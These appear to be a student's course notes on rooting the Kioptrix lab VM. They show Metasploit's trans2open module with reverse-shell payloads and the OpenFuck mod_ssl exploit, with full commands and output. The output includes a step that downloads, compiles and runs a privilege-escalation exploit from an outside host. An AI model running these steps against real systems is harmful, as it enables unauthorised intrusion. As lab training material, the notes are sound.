
# Gaining Root w/ Metasploit
Before we pop a shell on Kioptrix, let's choose an exploit we want to use. Going back to what we found *via [searchsploit](/cybersecurity/tools/exploitation/searchsploit.md)* we can even find one which has a *known [Metasploit](cybersecurity/tools/exploitation/metasploit.md) module*:
![](PNPT/PNPT-pics/gaining-root-1.png)
Since it shows up so often in the output, let's try [trans2open](/cybersecurity/vulnerabilities/trans2.md) 
## Running Metasploit
### `search`
Once we've executed `msfconsole` and we're in the Metasploit console, we can search for trans2open w/ the `search` command:
```bash
msf6 > search trans2open

Matching Modules
================
#  Name                              Disclosure Date  Rank   Check  Description
-  ----                              ---------------  ----   -----  -----------
0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open 
	Overflow (*BSD x86)
1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open 
	Overflow (Linux x86)
2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open 
	Overflow (Mac OS X PPC)
3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open 
	Overflow (Solaris SPARC)

Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
```
### `use`
From this list we can use the `use` command to choose a specific module and enter its context (make sure to choose one which matches the target):
```bash
msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > 
```
### `options`
Now that our context is set, we can use `options` to see what configurable variables there are for this module:
```bash
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see <link>
   RPORT   139              yes       The target port (TCP)

Payload options (linux/x86/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.4         yes       The listen address (an interface may be 
									   specified)
   LPORT  4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```
In this case we need to set `RHOSTS` while `RPORT` (remote port), `LHOST` (local host), and `LPORT` (local port) are set for us (we can change these if we want).
### `set`
In order to set these options we can use the `set` command + the value we want to set & the new value:
```bash
msf6 exploit(linux/samba/trans2open) > set rhosts 10.0.2.5
rhosts => 10.0.2.5
```
### `show`
Using the `show` command we can verify the *target module* (not the target host). This includes the service we're exploiting as well as the technique:
```bash
msf6 exploit(linux/samba/trans2open) > show targets

Exploit targets:
=================
    Id  Name
    --  ----
=>  0   Samba 2.2.x - Bruteforce
```
`show` can also show us encoders, nops, exploits, payloads, auxiliaries, post, plugins, info, options, and favorites (all related to the Metasploit framework and the context we're in) (use *`show all`* to get a list of all of them at once).
### `run` / `exploit`
Once we've verified our context and variables we can run our exploit using either the `run` or `exploit` command:
```bash
msf6 exploit(linux/samba/trans2open) > exploit       # <- staged payload

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] 10.0.2.5:139 - Trying return address 0xbffffdfc...
[*] 10.0.2.5:139 - Trying return address 0xbffffcfc...
[*] 10.0.2.5:139 - Trying return address 0xbffffbfc...
[*] 10.0.2.5:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 10.0.2.5        # <- sending stage is a good sign
[*] 10.0.2.5 - Meterpreter session 1 closed.  Reason: Died
[*] 10.0.2.5:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 10.0.2.5
[*] 10.0.2.5 - Meterpreter session 2 closed.  Reason: Died
[-] Meterpreter session 2 is not valid and will be closed
[*] 10.0.2.5:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1017704 bytes) to 10.0.2.5
[*] 10.0.2.5 - Meterpreter session 3 closed.  Reason: Died
[*] 10.0.2.5:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1017704 bytes) to 10.0.2.5
[*] 10.0.2.5 - Meterpreter session 4 closed.  Reason: Died
[*] 10.0.2.5:139 - Trying return address 0xbffff6fc...
[*] 10.0.2.5:139 - Trying return address 0xbffff5fc... # <- we know it's failed
^C
[-] 10.0.2.5:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
```
The exploitation didn't work, part of the reason being that *we didn't set a [payload](/PNPT/PEH/exploit-basics/payloads.md)*. Instead, Metasploit set a default payload (`linux/x86/meterpreter/reverse_tcp`). We can tell from the path that it is a *staged payload*, which might be part of the reason it didn't work.
### `set`
To set our own payload, we can use the `set` command. This gives metasploit something to actually inject into memory we can access via this [buffer-overflow](/cybersecurity/TTPs/exploitation/binary-exploitation/buffer-overflow.md). To see a list of all the payloads, you can start typing `set payload`, then use double tap to see all of the available options:
```bash
msf6 exploit(linux/samba/trans2open) > set payload 
set payload generic/custom
set payload generic/debug_trap
set payload generic/shell_bind_aws_ssm
set payload generic/shell_bind_tcp
set payload generic/shell_reverse_tcp
...
```
In this case, we want a payload which will execute successfully on a linux target. 
```bash
set payload linux/x86/samba/reverse_shell_tcp
payload => linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > run
*] Started reverse TCP handler on 10.0.2.4:4444 
[*] 10.0.2.5:139 - Trying return address 0xbffffdfc...
[*] 10.0.2.5:139 - Trying return address 0xbffffcfc...
[*] 10.0.2.5:139 - Trying return address 0xbffffbfc...
[*] Command shell session 12 opened (10.0.2.4:4444 -> 10.0.2.5:32800) at 2023-09-30 16:43:23 -0400
whoami
root # <--- output from target
```
# Gaining Root 'Manually'
Instead of using Metasploit to do everything for us, we can achieve the same results manually.
## OpenFuck
[OpenFuck](/cybersecurity/vulnerabilities/openfuck.md) is another vulnerability which we found that Kioptrix is likely vulnerable to. Lets try to manually exploit Kioptrix w/ it.
### Using Searchsploit
We can get the exploit code for OpenFuck from either [Exploit-DB](https://www.exploit-db.com) or by using the [searchsploit](/cybersecurity/tools/exploitation/searchsploit.md) command (since we have a library of most of the Exploit DB database on hand already downloaded).
```bash
searchsploit openfuck
 Exploit Title                                             |  Path
----------------------------------------------------------------------- --------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c'              |unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c'            | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c'            | unix/remote/764.c
----------------------------------------------------------------------- --------------
Shellcodes: No Results
```
We've got 3 versions of OpenFuck on hand. Let's use `OpenFuck.c`, which is located at `/etc/share/exploitdb/exploits/usr/remote/21671.c`. Instead of using this version, lets copy it into a new folder called `kioptrix`
```bash
mkdir kioptrix
cp /usr/share/exploitdb/exploits/unix/remote/21671.c kioptrix/21671.c
```
**BEFORE EXECUTING SOME RANDOM MALWARE ON OUR MACHINE** let's check it against the [official repo](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/unix/remote/21671.c?ref_type=heads) (hosted on GitLab) listed on Exploit DB. Both ExploitDB and the repo mark this code as "EDB verified", meaning they've tested in themselves.
### Running `OpenFuck.c`
If we cat the OpenFuck code, we can find some instructions at the top of the file:
```bash
/*
source: https://www.securityfocus.com/bid/5363/info

A buffer-overflow vulnerability has been reported in some versions of OpenSSL.
The issue occurs in the handling of the client key value during the negotiation of the SSLv2 protocol. A malicious client may be able to exploit this vulnerability to execute arbitrary code as the vulnerable server process or possibly to create a denial-of-service condition.

***UPDATE: A worm that likely exploits this vulnerability has been discovered propagating in the wild. Additionally, this code includes peer-to-peer and distributed denial-of-service capabilities. There have been numerous reports of intrusions in Europe. It is not yet confirmed whether this vulnerability is in OpenSSL, mod_ssl, or another component. Administrators are advised to upgrade to the most recent versions or to disable Apache, if possible, until more information is available.
*/
/*
 * VERY PRIV8 spabam SPAX@zone-h.org
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 *
 */
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
...
```
We can see from the output that we need to compile the code using [gcc](/computers/linux/gcc.md):
```bash
gcc -o openfuck 21671.c -lcrypto
21671.c:715:31: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function); did you mean ‘SSL3_MAX_SSL_SESSION_ID_LENGTH’?
  715 |         unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];
      |                               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      |                               SSL3_MAX_SSL_SESSION_ID_LENGTH
21671.c:723:9: error: unknown type name ‘RC4_KEY’
  723 |         RC4_KEY* rc4_read_key;
```
Unfortunately, this code is old and will not easily compile. So we have to either fix all of the errors ourselves, or find someone who already has.
### Find a working version
When we used `searchsploit` to find all the exploit code r/t OpenFuck, there were three versions listed, one of which was `OpenFuckv2.c` w/ an ID of `47080`. We can cp it into our kioptrix dir like so:
```bash
cp /usr/share/exploitdb/exploits/unix/remote/47080 openfuck.c
```
Looking up this version on [exploit db](https://www.exploit-db.com/exploits/47080) we can see that it isn't verified like ID `21671` was. However, if we go to the [GitLab repo](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/unix/remote/47080.c?ref_type=heads) we can try to verify the code ourselves. 
![](PNPT/PNPT-pics/gaining-root-1%201.png)
Then we can try compiling it with `gcc`:
```bash
gcc -o openfuck of.c -lcrypto
of.c: In function ‘read_ssl_packet’:
of.c:534:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  534 |                 RC4(ssl->rc4_read_key, rec_len, buf, buf);
...
```
This time gcc only lists warnings and no errors, and if we check our directory, we can see that our binary exists `openfuck`.
## Exploitation
To figure out how to use our binary against the target, we can run it w/o any flags and see if the output gives us usage hints:
```bash
./openfuck

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./openfuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  
  Supported OffSet:
        0x00 - Caldera OpenLinux (apache-1.3.26)
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
...
```
We need to scroll the 'Supported Offsets' for our target:
```bash
...
	0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
    0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
```
### Execution
The command and output:
```bash
./openfuck 0x6b 10.0.2.5 -c 45
./openfuck 0x6b 10.0.2.5 -c 45                                                        
*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
...

Connection... 45 of 45
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8100
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--07:58:31--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c`
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c`: No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$            # <---- rev shell
bash-2.05$ whoami     # <---- our test command 
whoami                
apache                # <---- output on target machine
```

> [!My previous notes (linked in text)]
> - [Metasploit](https://github.com/TrshPuppy/obsidian-notes/tree/main/cybersecurity/tools/metasploit.md)
> - [trans2open](https://github.com/TrshPuppy/obsidian-notes/tree/main/cybersecurity/vulnerabilities/trans2.md) 
> - [buffer-overflow](https://github.com/TrshPuppy/obsidian-notes/tree/main/cybersecurity/TTPs/exploitation/buffer-overflow.md)
> - [OpenFuck](https://github.com/TrshPuppy/obsidian-notes/tree/main/cybersecurity/vulnerabilities/openfuck.md)
> - [gcc](https://github.com/TrshPuppy/obsidian-notes/tree/main/computers/linux/gcc.md) 

> [!Resources]
> - [Exploit-DB](https://www.exploit-db.com)
> - [Exploit DB Gitlab: OpenFuck.c 21671](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/unix/remote/21671.c?ref_type=heads)
> - [Exploit DB: OpenFuckv2.c 47080](https://www.exploit-db.com/exploits/47080)
> - [Exploit DB GitLab: OpenFuckv2.c 47080](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/unix/remote/47080.c?ref_type=heads)
> - [Offensive Security](https://offsec.com/)

